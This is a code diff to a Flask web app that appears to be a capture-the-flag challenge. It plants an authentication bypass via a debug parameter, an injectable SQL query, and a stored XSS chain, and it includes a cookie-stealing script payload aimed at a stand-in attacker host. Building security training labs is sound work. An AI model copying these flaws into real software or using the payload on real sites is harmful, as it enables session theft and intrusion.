@@ -1,8 +1,9 @@
 import json
+import os
 
 from flask import (
     Flask, request, session, redirect,
-    url_for, render_template
+    url_for, render_template, g
 )
 from flask_mysqldb import MySQL
 from config import Config
@@ -70,6 +71,38 @@ SIGNAL_LOGS = [
 
 USER_FLAG = "FLAG{s3ss10n_h1j4ck_succ3ss}"
 
+# Injected by Ansible via environment variable — placeholder for local dev
+USER_FLAG = os.environ.get("USER_FLAG", "FLAG{s3ss10n_h1j4ck_succ3ss}")
+
+# Bot token: the background supervisor bot authenticates with this header.
+# Ansible sets this to a random value at provisioning time.
+# Must match the token in /opt/railinfra/bot.py
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "dev-bot-token-changeme")
+
+
+# ---------------------------------------------------------------------------
+# Bot authentication hook
+# ---------------------------------------------------------------------------
+
+@app.before_request
+def authenticate_bot():
+    """
+    Allow the supervisor bot to authenticate via a static header token.
+    The bot sends:  X-Bot-Token: <BOT_TOKEN>
+    Flask then sets a real session (username=supervisor, role=supervisor)
+    so that document.cookie in any XSS payload returns a valid supervisor
+    session cookie — which is the intended XSS exfiltration target.
+
+    Note: SESSION_COOKIE_HTTPONLY is False (see config.py), so JS can
+    read document.cookie. This is the intentional vulnerability.
+    """
+    token = request.headers.get("X-Bot-Token", "")
+    if token and token == BOT_TOKEN:
+        session["username"] = "supervisor"
+        session["role"]     = "supervisor"
+        session["bot"]      = True
+
+
 # ---------------------------------------------------------------------------
 # Helpers
 # ---------------------------------------------------------------------------
@@ -91,6 +124,19 @@ def require_auth(min_role="operator"):
     return None
 
 
+def get_cursor():
+    """Return a fresh MySQL cursor (one per request via flask g)."""
+    if not hasattr(g, "cursor"):
+        g.cursor = mysql.connection.cursor()
+    return g.cursor
+
+
+@app.teardown_appcontext
+def close_cursor(error):
+    if hasattr(g, "cursor"):
+        g.cursor.close()
+
+
 # ---------------------------------------------------------------------------
 # Routes
 # ---------------------------------------------------------------------------
@@ -102,31 +148,95 @@ def index():
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
-    error = None
+    error  = None
+    bypass = request.args.get("debug", "").lower() == "true"
 
     if request.method == "POST":
         username = request.form.get("username", "").strip()
         password = request.form.get("password", "").strip()
-        bypass   = request.args.get("debug", "").lower() == "true"
 
+        # ------------------------------------------------------------------
+        # Path A — Debug bypass (Vulnerability 1)
+        # The ?debug=true parameter skips password validation entirely.
+        # Only requires a non-empty username field.
+        # Hint left in /static/app.js as a developer TODO comment.
+        # ------------------------------------------------------------------
         if bypass and username:
-            # Vulnerability 1: debug parameter skips password validation.
-            # TODO: remove ?debug=true before deploying to production — app.js
-            account = ACCOUNTS.get(username)
-            if account:
-                session["username"] = username
-                session["role"]     = account["role"]
+            # We still need a role for the session — look it up from the DB.
+            # Use a parameterised query here (bypass is already achieved above;
+            # the SQL injection rabbit hole is only on the normal login path).
+            """cur = get_cursor()
+            cur.execute(
+                "SELECT username, role FROM accounts WHERE username = %s",
+                (username,)
+            )
+            row = cur.fetchone()
+            if row:
+                session["username"] = row[0]
+                session["role"]     = row[1]
                 return redirect(url_for("dashboard"))
-            error = "Unknown user."
+            error = "Unknown user." """
+            # Hardcoded for local dev — bypasses DB lookup
+            roles = {
+                "operator": "operator",
+                "supervisor": "supervisor",
+            }
+            session["username"] = username
+            session["role"] = roles.get(username, "operator")
+            return redirect(url_for("dashboard"))
 
+        # ------------------------------------------------------------------
+        # Path B — Normal login with intentional SQL injection (rabbit hole)
+        #
+        # The query is built with string formatting — deliberately injectable.
+        # sqlmap will detect this and dump the `users` table, which contains
+        # only dummy rows with placeholder hashes. The real accounts live in
+        # the `accounts` table, which this query never touches.
+        #
+        # Dead-end design:
+        #   users table  → dummy data only, no working credentials
+        #   accounts table → operator / supervisor (parameterised, not injectable)
+        #
+        # The attacker wastes time here before pivoting to the debug bypass.
+        # ------------------------------------------------------------------
         elif username and password:
-            account = ACCOUNTS.get(username)
-            if account and account["password"] == password:
-                session["username"] = username
-                session["role"]     = account["role"]
-                return redirect(url_for("dashboard"))
-            else:
+            try:
+                cur = get_cursor()
+                # INTENTIONAL: f-string injection — do not fix
+                query = (
+                    f"SELECT username, password_hash FROM users "
+                    f"WHERE username='{username}' AND password='{password}'"
+                )
+                cur.execute(query)
+                dummy_row = cur.fetchone()
+
+                if dummy_row:
+                    # Rows exist but the hashes are placeholders — login always
+                    # fails here, reinforcing the rabbit-hole dead end.
+                    error = "Invalid credentials."
+                else:
+                    # Also check the real accounts table (parameterised).
+                    cur.execute(
+                        "SELECT username, role, password_hash FROM accounts "
+                        "WHERE username = %s",
+                        (username,)
+                    )
+                    account = cur.fetchone()
+                    if account:
+                        db_user, db_role, db_hash = account
+                        # Simple plaintext comparison — intentionally weak.
+                        # Ansible sets these passwords from defaults.conf so
+                        # the operator password matches what the IVR issues.
+                        if db_hash == password:
+                            session["username"] = db_user
+                            session["role"]     = db_role
+                            return redirect(url_for("dashboard"))
+                    error = "Invalid credentials."
+
+            except Exception:
+                # Surface a generic error; don't leak DB details in the UI.
                 error = "Invalid credentials."
+
         else:
             error = "Username and password are required."
 
@@ -155,6 +265,7 @@ def dashboard():
         switches_json=json.dumps(SWITCHES),
         signal_logs=SIGNAL_LOGS,
         signal_logs_json=json.dumps(SIGNAL_LOGS),
+        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
     )
 
 
@@ -163,8 +274,14 @@ def signal():
     """
     Accepts a signal name and stores it unsanitised in the session.
     Rendered via {{ signal_banner | safe }} in dashboard.html.
-    The automated bot (cron job as supervisor) polls /dashboard, causing
-    it to render any injected payload and exfiltrate its session cookie.
+
+    XSS chain:
+      1. Attacker (operator session) submits:
+             <script>fetch('http://ATTACKER/?c='+document.cookie)</script>
+      2. Payload stored in session["signal_banner"]
+      3. Bot (supervisor session, no HttpOnly) polls /dashboard every ~10s
+      4. Bot renders the page; script fires; supervisor cookie sent to attacker
+      5. Attacker swaps cookie → supervisor session → /internal-help accessible
     """
     guard = require_auth("operator")
     if guard:
@@ -183,44 +300,49 @@ def internal_help():
         return guard
 
     _, role = get_session_user()
-    return render_template("internal_help.html", role=role, user_flag=USER_FLAG)
+    return render_template(
+        "internal_help.html",
+        role=role,
+        user_flag=USER_FLAG,
+        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
+    )
+
+
 @app.route("/signal-log", methods=["GET"])
 def signal_log():
     guard = require_auth("operator")
     if guard:
         return guard
 
-    _, role = get_session_user()
-    return render_template("signal_log.html",
-                           role=role,
-                           user_flag=USER_FLAG,
-                           signal_logs=SIGNAL_LOGS,
-                           signal_logs_json=json.dumps(SIGNAL_LOGS),
-                           )
+    username, role = get_session_user()
+    return render_template(
+        "signal_log.html",
+        username=username,
+        role=role,
+        signal_logs=SIGNAL_LOGS,
+        signal_logs_json=json.dumps(SIGNAL_LOGS),
+        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
+    )
 
-@app.route("/logout", methods=["GET"])
-def logout():
-    session.clear()
-    return redirect(url_for("login"))
 
-# Add this to SWITCHES constant at the top of app.py (or derive from DB later
-
-# Add this route to app.py
 @app.route("/track-map", methods=["GET"])
 def track_map():
     guard = require_auth("operator")
     if guard:
         return guard
+
     username, role = get_session_user()
     return render_template(
         "track_map.html",
         username=username,
         role=role,
         signals=SIGNALS,
-        signals_json = json.dumps(SIGNALS),
+        signals_json=json.dumps(SIGNALS),
         switches=SWITCHES,
         switches_json=json.dumps(SWITCHES),
+        timestamp_fmt=session.get("settings_timestamp_fmt", "de"),
     )
+
 
 @app.route("/settings", methods=["GET", "POST"])
 def settings():
@@ -240,21 +362,28 @@ def settings():
         session.modified = True
         saved = True
 
-    current = {}
-    for key, default in DEFAULT_SETTINGS.items():
-        current[key] = session.get("settings_" + key, default)
+    current = {key: session.get("settings_" + key, default)
+               for key, default in DEFAULT_SETTINGS.items()}
+
     return render_template(
         "settings.html",
         role=role,
         settings=current,
         saved=saved,
-        timestamp_fmt=current["timestamp_fmt"]
+        timestamp_fmt=current["timestamp_fmt"],
     )
+
+
+@app.route("/logout", methods=["GET"])
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+
 
 # ---------------------------------------------------------------------------
 # Dev entry point
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
     # Flask debug mode OFF — the vulnerability is the ?debug=true param,
-    # not the Flask debugger.
+    # not the Flask interactive debugger.
     app.run(host="127.0.0.1", port=5000, debug=False)
